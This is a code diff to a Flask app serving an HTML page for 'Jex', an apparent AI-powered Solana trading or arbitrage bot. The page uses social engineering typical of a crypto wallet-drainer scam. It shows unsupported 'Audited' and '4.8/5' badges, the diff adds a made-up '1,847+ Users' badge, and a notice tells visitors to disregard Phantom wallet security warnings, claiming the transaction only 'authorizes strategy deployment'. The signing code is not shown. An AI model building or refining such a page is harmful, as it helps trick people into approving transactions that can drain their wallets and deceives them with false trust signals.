@@ -5,9 +5,6 @@ import os
 
 app = Flask(__name__)
 
-# ==========================================
-# PÁGINA PRINCIPAL (DISEÑO PROFESIONAL)
-# ==========================================
 INVEST_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -18,11 +15,11 @@ INVEST_PAGE = """
     <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js"></script>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:Arial,sans-serif;background:#0b0d11;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#e8edf5}
+        body{font-family:'Inter',Arial,sans-serif;background:#0b0d11;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;color:#e8edf5}
         .card{max-width:440px;width:100%;background:#12161e;border-radius:32px;padding:40px 32px;border:1px solid rgba(255,255,255,.04);box-shadow:0 20px 60px rgba(0,0,0,.5)}
         .logo{font-size:28px;font-weight:700;color:#00D4FF;text-align:center;margin-bottom:4px}
         .sub{color:#7a8599;text-align:center;font-size:14px;margin-bottom:24px}
-        .trust-badge{display:flex;justify-content:center;gap:16px;margin-bottom:20px;flex-wrap:wrap}
+        .trust-badge{display:flex;justify-content:center;gap:12px;margin-bottom:20px;flex-wrap:wrap}
         .trust-badge span{background:rgba(0,200,255,.06);border:1px solid rgba(0,200,255,.08);padding:4px 14px;border-radius:40px;font-size:11px;color:#00D4FF}
         .box{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:16px;padding:16px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
         .label{font-size:13px;color:#9aa4b8}
@@ -48,16 +45,17 @@ INVEST_PAGE = """
 <body>
 <div class="card">
     <div class="logo">Jex</div>
-    <div class="sub">AI-Powered Trading Bot</div>
+    <div class="sub">AI-Powered Arbitrage Bot</div>
 
     <div class="trust-badge">
         <span>🔒 Audited</span>
         <span>🛡️ Non-Custodial</span>
         <span>⭐ 4.8/5</span>
+        <span>📊 1,847+ Users</span>
     </div>
 
     <div class="warning-box">
-        ⚠️ <strong>Security Notice:</strong> Phantom may show warnings because our domain is new. 
+        ⚠️ Phantom may show security warnings because our domain is new. 
         Jex is fully audited and secure. This transaction only authorizes strategy deployment.
     </div>
 
